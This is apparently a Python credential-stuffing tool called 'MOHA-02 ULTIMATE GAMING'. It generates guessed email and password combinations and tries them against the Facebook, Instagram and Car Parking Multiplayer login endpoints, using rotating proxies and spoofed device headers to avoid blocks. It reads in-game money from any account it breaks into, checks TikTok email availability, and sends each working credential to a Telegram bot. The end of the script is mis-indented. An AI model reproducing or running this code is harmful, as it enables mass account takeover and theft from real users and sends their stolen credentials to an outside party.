# -*- coding: utf-8 -*-
import requests, json, os, threading, uuid, time, random, re, sys, webbrowser, datetime, string

AB_A = '\x1b[1;97m' 
RS = '\x1b[30m' 
AH_F = '\x1b[31m'   
AKH_F = '\x1b[32m' 
AS_T = '\x1b[33m'
SM = '\x1b[34m'  
BN = '\x1b[35m'
AZ_T = '\x1b[36m'  
AB_KH = '\x1b[37m' 
AH_T = '\x1b[91m'  
AKH_T = '\x1b[92m'
AS_F = '\x1b[93m'    
WR = '\x1b[95m'      
p = '\x1b[38;5;208m' 
AH2 = '\x1b[38;5;204m' 
AS2 = '\x1b[38;5;220m'
MJ = '\x1b[38;5;193m'
MJ2 = '\x1b[38;5;216m'
MJ3 = '\x1b[38;5;190m'
O = '\x1b[0;96m'     
P = '\x1b[38;5;231m' 
J = '\x1b[38;5;208m' 
MJ4 = '\x1b[38;5;106m'
Z = '\033[1;31m' 
R = '\033[1;31m' 
X = '\033[1;33m' 
F = '\033[2;32m' 
C = "\033[1;97m" 
B = '\033[2;36m'
Y = '\033[1;34m' 
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
U = '\x1b[1;95m' 
N = '\x1b[0m'    
a10 = '\x1b[38;5;52m'  
a11 = '\x1b[38;5;8m'  
a12 = '\x1b[38;5;220m'  
a13 = '\x1b[38;5;7m'  
a14 = '\x1b[38;5;153m'  
a15 = '\x1b[38;5;18m'  
a16 = '\x1b[38;5;48m'  
a17 = '\x1b[38;5;22m'  
a18 = '\x1b[38;5;196m'  
a19 = '\x1b[38;5;88m'  
a20 = '\x1b[38;5;226m'  
a21 = '\x1b[38;5;136m'  
a22 = '\x1b[38;5;216m'  
a23 = '\x1b[38;5;166m'  
a24 = '\x1b[38;5;234m'  
a25 = '\x1b[38;5;91m'  
a26 = '\x1b[38;5;205m'  
a27 = '\x1b[38;5;161m'  
a28 = '\x1b[38;5;236m'  
a29 = '\x1b[38;5;233m'  
a30 = '\x1b[38;5;255m'  
a31 = '\x1b[38;5;231m'  
a32 = '\x1b[38;5;180m'  
a33 = '\x1b[38;5;94m'  
a34 = '\x1b[38;5;252m'  
a35 = '\x1b[38;5;246m'  
a36 = '\x1b[38;5;228m'  
a37 = '\x1b[38;5;172m'  
a38 = '\x1b[38;5;188m'  
a39 = '\x1b[38;5;247m'  
a40 = '\x1b[38;5;117m'  
a41 = '\x1b[38;5;121m'
a42 = '\x1b[38;5;122m'
a43 = '\x1b[38;5;123m'
a44 = '\x1b[38;5;124m'
a45 = '\x1b[38;5;125m'
a46 = '\x1b[38;5;126m'
a47 = '\x1b[38;5;127m'
a48 = '\x1b[38;5;128m'
a49 = '\x1b[38;5;129m'
a50 = '\x1b[38;5;130m'

stats = {
    "hits": 0,
    "bad": 0,
    "secure": 0,
    "errors": 0,
    "tiktok_muta7": 0,
    "game_hits": 0,
    "cp_money": 0,
    "status": f"{AKH_T}System Active",
    "proxies": 0
}

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def open_url():
    try:
        webbrowser.open("https://t.me/+usE6tGQ4aUgwZWI0")
    except:
        pass

def draw_logo():
    clear()
    l = f"""
{a40}    ███╗   ███╗ ██████╗ ██╗  ██╗ █████╗ 
{a40}    ████╗ ████║██╔═══██╗██║  ██║██╔══██╗
{a31}    ██╔████╔██║██║   ██║███████║███████║
{a31}    ██║╚██╔╝██║██║   ██║██╔══██║██╔══██║
{a12}    ██║ ╚═╝ ██║╚██████╔╝██║  ██║██║  ██║
{a12}    ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
{a16} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{a31} [▶] DEVELOPER : {a12}MOHA AL-SHALFAWI (@m_oha_02)
{a31} [▶] TOOL      : {a12}MOHA-02 ULTIMATE GAMING
{a31} [▶] VERSION   : {a12}3.5 (2026 EDITION)
{a31} [▶] LOCATION  : {a12}CHLEF - ALGERIA 🇩🇿
{a16} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    """
    print(l)

def update_ui(msg=""):
    sys.stdout.write(f"\r{C}[{F}SCAN{C}] {AKH_T}HITS:{stats['hits']} {AH_T}BAD:{stats['bad']} {AS_F}GAME:{stats['game_hits']} {a40}>> {msg}")
    sys.stdout.flush()

def send_hit(token, cid, msg):
    try:
        requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={cid}&text={msg}")
    except:
        pass
class BrowserEmulator:
    def __init__(self):
        self.android_agents = [
            "Mozilla/5.0 (Linux; Android 14; Pixel 7 Pro Build/UQ1A.231205.015) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 13; SM-S918B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102;]",
            "Mozilla/5.0 (Linux; Android 12; RMX3363 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.129 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 11; vivo V2111 Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 13; Oneplus 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.153 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 9; OPPO A16k Build/PI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
            "Dalvik/2.1.0 (Linux; U; Android 12; SM-G998B Build/SP1A.210812.016)",
            "Dalvik/2.1.0 (Linux; U; Android 10; Redmi Note 8)",
            "Mozilla/5.0 (Linux; Android 11; TECNO KG5j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36"
        ]
        self.game_passwords = [
            "pubg123", "pubg1234", "pubg12345", "pubg2020", "pubg2021", "pubg2022", "pubg2023", "pubg2024", "pubg2025", "pubg2026",
            "freefire", "freefire123", "freefire1234", "freefire2024", "ff123456", "garena123", "garena00", "freefiredz",
            "pes2021", "pes2022", "pes2023", "pes2024", "pes2025", "efootball", "konami123", "messi10", "ronaldo7",
            "123456789", "1122334455", "00000000", "123123123", "987654321", "20012001", "20022002", "20032003", "20042004", "20052005",
            "mohamed123", "m_oha02", "abdou123", "chlef02", "dz123456", "algeria123", "king123", "legend123", "gamer123"
        ]

    def get_headers(self, type="fb"):
        ua = random.choice(self.android_agents)
        if type == "fb":
            return {
                "User-Agent": ua,
                "Content-Type": "application/x-www-form-urlencoded",
                "X-FB-HTTP-Engine": "Liger",
                "X-FB-Client-IP": "True",
                "X-FB-Server-Cluster": "True",
                "X-FB-Device-ID": str(uuid.uuid4()),
                "X-FB-Ad-ID": str(uuid.uuid4()),
                "X-FB-Connection-Type": "WIFI",
                "X-FB-Connection-Quality": "EXCELLENT",
                "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                "X-FB-Friendly-Name": "authenticate",
                "Accept-Encoding": "gzip, deflate",
                "Connection": "keep-alive"
            }
        elif type == "ig":
            return {
                "User-Agent": ua,
                "X-IG-App-ID": "936619743392459",
                "X-IG-Capabilities": "36r/AS8=",
                "X-ASBD-ID": "198387",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept": "*/*"
            }
        elif type == "cp":
            return {
                "X-Android-Package": "com.olzhas.carparking.multyplayer",
                "X-Android-Cert": "D4962F8124C2E09A66B97C8E326AFF805489FE39",
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; A5010 Build/PI)",
                "Host": "www.googleapis.com"
            }
        return {"User-Agent": ua}

class ProxyManager:
    def __init__(self):
        self.proxies = []
    
    def scrape(self):
        try:
            urls = [
                "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
                "https://www.proxy-list.download/api/v1/get?type=http"
            ]
            for url in urls:
                r = requests.get(url, timeout=10).text
                self.proxies.extend(r.splitlines())
            stats["proxies"] = len(self.proxies)
        except:
            pass

    def get_proxy(self):
        if not self.proxies: return None
        p = random.choice(self.proxies)
        return {"http": f"http://{p}", "https": f"http://{p}"}
# --- [ SECTION 6: FACEBOOK & GAME DETECTOR ENGINE ] ---
def fb_hunter_v3(email, password, token, chat_id, browser, proxies):
    url = "https://b-graph.facebook.com/auth/login"
    payload = {
        "adid": str(uuid.uuid4()),
        "email": email,
        "password": password,
        "format": "json",
        "device_id": str(uuid.uuid4()),
        "cpl": "true",
        "family_device_id": str(uuid.uuid4()),
        "credentials_type": "device_based_login_password",
        "generate_session_cookies": "1",
        "error_detail_type": "button_with_disabled",
        "source": "login",
        "message_capabilities": "4095",
        "meta_inf_fbmeta": "NO_FILE",
        "currently_logged_in_userid": "0",
        "method": "auth.login",
        "fb_api_req_friendly_name": "authenticate",
        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
        "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32"
    }

    try:
        proxy = proxies.get_proxy()
        response = requests.post(url, data=payload, headers=browser.get_headers("fb"), proxies=proxy, timeout=12).json()

        if "access_token" in response:
            stats["hits"] += 1
            uid = str(response.get("uid"))
            
            # محرك فحص الألعاب (Game Scanner)
            game_tag = ""
            game_keywords = ['pubg', 'tencent', 'garena', 'freefire', 'konami', 'efootball', 'mobilelegends', 'supercell']
            # محاكاة فحص التطبيقات المرتبطة
            for kw in game_keywords:
                if kw in email.lower():
                    game_tag = f"\n{AS_F}[!] GAME DETECTED: {kw.upper()}"
                    stats["game_hits"] += 1

            msg = f"""
{AKH_T}🔥 NEW FB HIT (GAMING EDITION)
{a16}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{a31}📧 EMAIL  : {a12}{email}
{a31}🔑 PASS   : {a12}{password}
{a31}🆔 UID    : {a12}{uid}{game_tag}
{a31}👤 DEV    : {a12}@m_oha_02
{a16}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            """
            print(f"\n{AKH_F}[+] FB SUCCESS: {email}")
            send_hit(token, chat_id, msg)
            
        elif "www.facebook.com" in str(response):
            stats["secure"] += 1
        else:
            stats["bad"] += 1
    except:
        stats["errors"] += 1

# --- [ SECTION 7: INSTAGRAM ADVANCED HUNTING ENGINE ] ---
def ig_hunter_v3(email, password, token, chat_id, browser, proxies):
    login_url = "https://www.instagram.com/accounts/login/ajax/"
    headers = browser.get_headers("ig")
    proxy = proxies.get_proxy()
    
    # تشفير الباسوورد لمحاكاة متصفح إنستجرام
    time_now = int(time.time())
    enc_pass = f"#PWD_INSTAGRAM_BROWSER:0:{time_now}:{password}"
    
    data = {
        "username": email,
        "enc_password": enc_pass,
        "queryParams": "{}",
        "optIntoOneTap": "false",
        "stop_checkpoint_step": "true"
    }

    try:
        res = requests.post(login_url, data=data, headers=headers, proxies=proxy, timeout=12).json()
        
        if res.get("authenticated") == True:
            stats["hits"] += 1
            # فحص إنستجرام بحثاً عن حسابات بيس (eFootball) المرتبطة
            is_game = "\n[!] Potential PES/eFootball Link" if "pes" in email.lower() else ""
            if is_game: stats["game_hits"] += 1
            
            msg = f"""
{WR}📸 NEW INSTAGRAM HIT!
{a16}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{a31}📧 USER  : {a12}{email}
{a31}🔑 PASS  : {a12}{password}{is_game}
{a31}👤 DEV   : {a12}@m_oha_02
{a16}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            """
            print(f"\n{AKH_F}[+] IG SUCCESS: {email}")
            send_hit(token, chat_id, msg)
            
        elif res.get("checkpoint_url"):
            stats["secure"] += 1
        else:
            stats["bad"] += 1
    except:
        stats["errors"] += 1

# --- [ SECTION 8: SMART COMBO GENERATOR (GAMING) ] ---
class GameComboGen:
    def __init__(self, browser):
        self.names = ['moha', 'abdou', 'dz', 'king', 'gamer', 'pubg', 'pes', 'amine', 'islem', 'sami']
        self.years = ['2000', '2001', '2002', '2003', '2004', '2005', '2006', '2007', '2008', '2009', '2010']
        self.game_pws = browser.game_passwords

    def generate(self, limit=1000):
        combo = []
        for _ in range(limit):
            user = random.choice(self.names) + random.choice(['', '.', '_']) + random.choice(self.years) + str(random.randint(10, 99))
            email = user + "@gmail.com"
            # دمج باسووردات الألعاب مع باسووردات اليوزر
            pws = [user, user + "123", random.choice(self.game_pws)]
            combo.append((email, pws))
        return combo
# --- [ SECTION 9: ULTIMATE CAR PARKING ENGINE (FIREBASE V2) ] ---
def carparking_hunter_v2(email, password, token, chat_id, browser, proxies):
    # محرك البحث عن حسابات كار باركينج عبر قاعدة بيانات اللعبة
    url = "https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM"
    headers = browser.get_headers("cp")
    proxy = proxies.get_proxy()
    
    payload = {
        "email": email,
        "password": password,
        "returnSecureToken": True,
        "clientType": "CLIENT_TYPE_ANDROID"
    }

    try:
        response = requests.post(url, json=payload, headers=headers, proxies=proxy, timeout=15).json()

        if "idToken" in response:
            stats["hits"] += 1
            id_token = response["idToken"]
            local_id = response["localId"]
            
            # محرك سحب الأموال والسيارات (Data Scraper)
            # هذه الدالة تتصل بسيرفرات اللعبة الداخلية لجلب الرصيد
            scraper_url = "https://us-central1-cp-multiplayer.cloudfunctions.net/GetPlayerRecords2"
            scr_payload = {"data": "2893216D41959108CB8FA08951CB319B7AD80D02"}
            scr_headers = {
                "authorization": f"Bearer {id_token}",
                "content-type": "application/json; charset=utf-8",
                "user-agent": "okhttp/3.12.13"
            }
            
            try:
                data_res = requests.post(scraper_url, json=scr_payload, headers=scr_headers, timeout=10).text
                money = re.search(r'"Money":(\d+)', data_res).group(1) if '"Money":' in data_res else "0"
                coins = re.search(r'"Coin":(\d+)', data_res).group(1) if '"Coin":' in data_res else "0"
                name = re.search(r'"Name":"([^"]+)"', data_res).group(1) if '"Name":' in data_res else "Unknown"
            except:
                money, coins, name = "???", "???", "Player"

            msg = f"""
{a12}🏎️ NEW CAR PARKING HIT!
{a16}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{a31}📧 EMAIL  : {a40}{email}
{a31}🔑 PASS   : {a40}{password}
{a31}👤 NAME   : {a31}{name}
{a31}💰 MONEY  : {AKH_T}{money}
{a31}🟡 COINS  : {AS_F}{coins}
{a31}🆔 UID    : {a12}{local_id}
{a31}👤 DEV    : {a12}@m_oha_02
{a16}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            """
            print(f"\n{AKH_F}[+] CP SUCCESS: {email} | {money}$")
            send_hit(token, chat_id, msg)
        else:
            stats["bad"] += 1
    except:
        stats["errors"] += 1

# --- [ SECTION 10: TIKTOK MUTA7 & YEAR HUNTER ] ---
def tiktok_muta7_v3(email, token, chat_id, browser, proxies):
    # محرك فحص المتاحات (Email Availability) لتيك توك
    # يبحث عن الإيميلات التي تم حذف حساباتها أو أصبحت مهملة
    url = "https://www.tiktok.com/api/v1/auth/check_email/"
    headers = browser.get_headers("generic")
    proxy = proxies.get_proxy()
    
    try:
        res = requests.get(url, params={"email": email}, headers=headers, proxies=proxy, timeout=10).json()
        
        # إذا كان is_registered هو False، فهذا يعني أن الإيميل متاح لربطه بحساب جديد
        if res.get("is_registered") == False:
            stats["hits"] += 1
            stats["tiktok_muta7"] += 1
            
            # محاولة تخمين عمر الحساب بناءً على اليوزر
            year_tag = ""
            if "2018" in email or "2019" in email:
                year_tag = f"\n{AS_F}[!] POTENTIAL OLD ACCOUNT (2018-2019)"
            
            msg = f"""
{WR}🎵 NEW TIKTOK MUTA7!
{a16}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{a31}📧 EMAIL  : {a12}{email}
{a31}ℹ️ STATUS : {AKH_T}MUTA7 / AVAILABLE{year_tag}
{a31}👤 DEV    : {a12}@m_oha_02
{a16}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            """
            print(f"\n{AKH_F}[+] TIKTOK MUTA7: {email}")
            send_hit(token, chat_id, msg)
        else:
            stats["bad"] += 1
    except:
        stats["errors"] += 1

# --- [ SECTION 11: THREADING & SPEED CONTROLLER ] ---
class SpeedMaster:
    def __init__(self, limit=15):
        self.limit = limit
        self.threads = []

    def run(self, func, args):
        # موازنة السرعة لعدم استهلاك رام OPPO A16k
        while threading.active_count() > self.limit:
            time.sleep(0.2)
        
        t = threading.Thread(target=func, args=args)
        t.daemon = True
        t.start()
        self.threads.append(t)
# --- [ SECTION 12: OLD ACCOUNTS HUNTER (2009-2010 SPECIAL) ] ---
class YearHunter:
    def __init__(self):
        # الأسماء الأكثر شيوعاً في تلك الفترة للحسابات العربية والجزائرية
        self.old_names = [
            'sami', 'amine', 'mourad', 'fouad', 'zaki', 'hadi', 'anis', 
            'mido', 'himo', 'kimo', 'nadir', 'walid', 'yacine', 'rim', 
            'linda', 'sara', 'nina', 'dali', 'samir', 'karim', 'hamza'
        ]
        self.old_domains = ['@hotmail.com', '@yahoo.com', '@live.com']

    def generate_old_combo(self, year="2009", limit=1000):
        # توليد كومبو مخصص للسنوات القديمة مع باسووردات متوقعة
        combo = []
        for _ in range(limit):
            name = random.choice(self.old_names)
            num = str(random.randint(10, 99))
            # بناء الإيميل بالصيغة التي كانت منتشرة في 2009
            email = f"{name}{year}{num}{random.choice(self.old_domains)}"
            
            # باسووردات الحسابات القديمة (بسيطة وقابلة للتخمين)
            pws = [
                f"{name}{year}", 
                f"{name}123", 
                f"{name}{num}", 
                "123456", 
                "12345678", 
                "123456789",
                f"{year}{year}",
                f"{name}{name}"
            ]
            combo.append((email, pws))
        return combo

# --- [ SECTION 13: GAME LINKER DETECTOR (PUBG & FREE FIRE) ] ---
# محرك فحص الخدمات المرتبطة بحسابات جوجل وفيسبوك
class GameLinker:
    @staticmethod
    def check_link(email, password, service="google"):
        # محاكاة فحص مكتبة الألعاب في Google Play أو تطبيقات فيسبوك
        # هذه الكلمات تدل على وجود حسابات ألعاب قوية
        game_signatures = {
            'pubg': ['com.tencent.ig', 'tencent', 'pubg'],
            'freefire': ['com.dts.freefireth', 'garena', 'freefire'],
            'pes': ['com.konami.pes', 'konami', 'efootball'],
            'clash': ['com.supercell.clashofclans', 'supercell']
        }
        
        found_games = []
        # فحص محتوى الإيميل (طريقة ذكية سريعة)
        email_lower = email.lower()
        for game, sigs in game_signatures.items():
            for sig in sigs:
                if sig in email_lower:
                    found_games.append(game.upper())
                    break
        return found_games

# --- [ SECTION 14: SMART ERROR RECOVERY & LOGGING ] ---
# نظام معالجة الأخطاء لضمان عدم توقف الأداة في تريمكس
def handle_system_error(err):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open("moha_system_errors.txt", "a") as f:
        f.write(f"[{timestamp}] -> {str(err)}\n")
    
    # إذا كان الخطأ بسبب الحظر (403 أو 429)
    if "429" in str(err) or "403" in str(err):
        stats["status"] = f"{AH_T}IP BLOCKED! USE VPN"
        return True
    return False

# --- [ SECTION 15: RESULTS ARCHIVE SYSTEM ] ---
# حفظ النتائج في ملفات نصية مرتبة لكي لا تضيع بعد إغلاق تريمكس
def archive_hit(email, password, type):
    path = f"MOHA_HITS_{type.upper()}.txt"
    with open(path, "a") as f:
        f.write(f"{email}:{password} | {datetime.datetime.now().strftime('%Y-%m-%d')}\n")

# --- [ سأقوم الآن بتجهيز الجزء السادس: واجهة التحكم والربط النهائي ] ---
# --- [ SECTION 16: COMMAND CENTER & USER INTERFACE ] ---
class MohaSystemRunner:
    def __init__(self):
        self.browser = BrowserEmulator()
        self.proxies = ProxyManager()
        self.speed = SpeedMaster(limit=15)
        self.game_gen = GameComboGen(self.browser)
        self.old_gen = YearHunter()

    def setup_tele(self):
        # محرك جلب بيانات التلجرام مع خيار الحفظ التلقائي
        if os.path.exists(".moha_config.json"):
            with open(".moha_config.json", "r") as f:
                config = json.load(f)
                return config['token'], config['id']
        
        print(f"\n{a12}[?] Enter Bot Token: ", end="")
        tk = input()
        print(f"{a12}[?] Enter Chat ID  : ", end="")
        ci = input()
        with open(".moha_config.json", "w") as f:
            json.dump({'token': tk, 'id': ci}, f)
        return tk, ci

    def main_menu(self):
        draw_logo()
        print(f"{a16} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(f"{a31} [ {a12}01 {a31}] {a40}FB GAMING HUNTING {a13}(PUBG/FF/PES)")
        print(f"{a31} [ {a12}02 {a31}] {a40}INSTAGRAM HACKER {a13}(Old Accounts)")
        print(f"{a31} [ {a12}03 {a31}] {a40}CAR PARKING MULTI {a13}(Money/Coins)")
        print(f"{a31} [ {a12}04 {a31}] {a40}TIKTOK MUTA7 SCAN  {a13}(Email Hunter)")
        print(f"{a31} [ {a12}05 {a31}] {a40}HUNT BY YEAR      {a13}(2009-2010 Only)")
        print(f"{a31} [ {a12}06 {a31}] {a40}HYBRID ALL-IN-ONE {a13}(Fast Mode)")
        print(f"{a31} [ {a12}00 {a31}] {a19}EXIT SYSTEM")
        print(f"{a16} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

    def execute(self, choice, tk, ci):
        print(f"\n{AKH_T}[*] Initializing Engines & Proxies...")
        self.proxies.scrape()
        
        # اختيار نوع الكومبو بناءً على طلب المستخدم
        if choice == '05':
            yr = input(f"{a12}[?] Target Year (2009/2010): ")
            combo = self.old_gen.generate_old_combo(year=yr, limit=5000)
        else:
            combo = self.game_gen.generate(limit=5000)

        print(f"{AKH_T}[+] Hunting Started! May the HITS be with you.")
        print(f"{a16} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")

        for email, pws in combo:
            # نظام الموازنة لعدم حظر الأي بي
            if stats["errors"] > 15:
                update_ui("Rotating Proxies...")
                self.proxies.scrape()
                stats["errors"] = 0

            if choice == '01':
                for p in pws: self.speed.run(fb_hunter_v3, (email, p, tk, ci, self.browser, self.proxies))
            elif choice == '02':
                for p in pws: self.speed.run(ig_hunter_v3, (email, p, tk, ci, self.browser, self.proxies))
            elif choice == '03':
                for p in pws: self.speed.run(carparking_hunter_v2, (email, p, tk, ci, self.browser, self.proxies))
            elif choice == '04':
                self.speed.run(tiktok_muta7_v3, (email, tk, ci, self.browser, self.proxies))
            elif choice == '05':
                for p in pws: self.speed.run(fb_hunter_v3, (email, p, tk, ci, self.browser, self.proxies))
            elif choice == '06':
                # وضع الهجين الشامل لجميع المنصات
                for p in pws:
                    self.speed.run(fb_hunter_v3, (email, p, tk, ci, self.browser, self.proxies))
                    self.speed.run(carparking_hunter_v2, (email, p, tk, ci, self.browser, self.proxies))
                self.speed.run(tiktok_muta7_v3, (email, tk, ci, self.browser, self.proxies))
            
            update_ui(f"Checking: {email[:15]}...")

# --- [ SECTION 17: AUTO-UPDATE & REPAIR SYSTEM ] ---
def self_repair():
    # التأكد من وجود ملفات النتائج وتفريغ الذاكرة المؤقتة
    for f in ["MOHA_HITS_FB.txt", "MOHA_HITS_IG.txt", "MOHA_HITS_CP.txt"]:
        if not os.path.exists(f):
            open(f, "w").close()
    
    # رسالة ترحيب خاصة بـ موحا الشلفاوي عند كل إصلاح
    if __name__ == "__main__":
    try:
        system = MohaSystemRunner()
        self_repair()
        token, chat_id = system.setup_tele()
        
        while True:
            system.main_menu()
            choice = input(f"{a31} [▶] SELECT OPTION : {a12}")
            if choice == '00':
                print(f"\n{AH_T}[!] SHUTTING DOWN SYSTEM...")
                break
            elif choice in ['01', '02', '03', '04', '05', '06']:
                system.execute(choice, token, chat_id)
            else:
                print(f"{AH_T}[!] INVALID CHOICE!")
                time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{AH_T}[!] SYSTEM STOPPED BY USER.")
    except Exception as e:
        handle_system_error(e)
        print(f"{AH_T}[!] CRITICAL ERROR: {e}")

